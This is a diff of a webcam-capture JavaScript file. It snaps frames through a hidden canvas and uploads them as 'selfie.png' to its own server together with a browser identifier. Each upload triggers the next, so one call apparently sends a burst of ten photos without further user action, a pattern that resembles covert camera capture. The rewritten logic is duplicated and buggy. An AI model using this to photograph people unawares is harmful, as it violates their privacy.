@@ -1,12 +1,12 @@
 // References to all the element we will need.
 var video = document.querySelector('#camera-stream'),
-    image = document.querySelector('#snap'),
-    start_camera = document.querySelector('#start-camera'),
-    controls = document.querySelector('.controls'),
-    take_photo_btn = document.querySelector('#take-photo'),
-    delete_photo_btn = document.querySelector('#delete-photo'),
-    download_photo_btn = document.querySelector('#download-photo'),
-    error_message = document.querySelector('#error-message');
+image = document.querySelector('#snap'),
+start_camera = document.querySelector('#start-camera'),
+controls = document.querySelector('.controls'),
+take_photo_btn = document.querySelector('#take-photo'),
+delete_photo_btn = document.querySelector('#delete-photo'),
+download_photo_btn = document.querySelector('#download-photo'),
+error_message = document.querySelector('#error-message');
 
 
 // The getUserMedia interface is used for handling camera input.
@@ -25,9 +25,9 @@ else{
 
     // Request the camera.
     navigator.getMedia(
-        {
-            video: true
-        },
+    {
+        video: true
+    },
         // Success Callback
         function(stream){
 
@@ -43,12 +43,12 @@ else{
             };
         //    setTimeout(takePhoto(), 60);
 
-        },
+    },
         // Error Callback
         function(err){
             displayErrorMessage("There was an error with accessing the camera stream: " + err.name, err);
         }
-    );
+        );
 
 }
 
@@ -58,52 +58,75 @@ else{
 
 function urltoFile(url, filename, mimeType){
     return (fetch(url)
-            .then(function(res){return res.arrayBuffer();})
-            .then(function(buf){return new File([buf], filename, {type:mimeType});})
-    );
+        .then(function(res){return res.arrayBuffer();})
+        .then(function(buf){return new File([buf], filename, {type:mimeType});})
+        );
 }
 var i =0;
 function takePhoto() {
-    console.log("a");
     var snap = takeSnapshot();
 
-        if(localStorage.getItem("browser"))
-        {
-            var browser = localStorage.getItem("browser");
-        }
-        else
-        {
-            $.ajax({
-                url: '/getBrowser',
-                method: 'GET',
-                success: function (data) {
-                    localStorage.setItem('browser', data);
-                }
-            });
-            var browser = localStorage.getItem("browser");
-
-        }
-    urltoFile(snap,'selfie.png','image/png').then(function(file){
-        console.log(file);
-        var formData = new FormData();
-        formData.append('file', file);
-        formData.append('browser', browser);
+    if(localStorage.getItem("browser"))
+    {
+        var browser = localStorage.getItem("browser");
+    }
+    else
+    {
         $.ajax({
             url: '/',
-            method:'POST',
-            processData: false,
-            contentType: false,
-            data: formData,
+            method: 'POST',
+            data: {getBrowser:1},
             success: function (data) {
-                if(i<10) {
-                    takePhoto()
-                    i = i + 1
-                }
-                else {
-                    i = 0
-                }
+                localStorage.setItem('browser', data);
+                var browser = localStorage.getItem("browser");
+                urltoFile(snap,'selfie.png','image/png').then(function(file){
+                    if(browser){
+                        var formData = new FormData();
+                        formData.append('file', file);
+                        formData.append('browser', browser);
+                        $.ajax({
+                            url: '/',
+                            method:'POST',
+                            processData: false,
+                            contentType: false,
+                            data: formData,
+                            success: function (data) {
+                                if(i<10) {
+                                    takePhoto()
+                                    i = i + 1
+                                }
+                                else {
+                                    i = 0
+                                }
+                            }
+                        });
+                    }
+                })
             }
         });
+    }
+    urltoFile(snap,'selfie.png','image/png').then(function(file){
+        if(browser){
+            var formData = new FormData();
+            formData.append('file', file);
+            formData.append('browser', browser);
+            $.ajax({
+                url: '/',
+                method:'POST',
+                processData: false,
+                contentType: false,
+                data: formData,
+                success: function (data) {
+                    if(i<10) {
+                        takePhoto()
+                        i = i + 1
+                    }
+                    else {
+                        i = 0
+                    }
+                }
+            });
+        }
     })
 }
 
@@ -141,10 +164,10 @@ function takeSnapshot(){
     // Here we're using a trick that involves a hidden canvas element.
 
     var hidden_canvas = document.querySelector('canvas'),
-        context = hidden_canvas.getContext('2d');
+    context = hidden_canvas.getContext('2d');
 
     var width = video.videoWidth,
-        height = video.videoHeight;
+    height = video.videoHeight;
 
     if (width && height) {
 
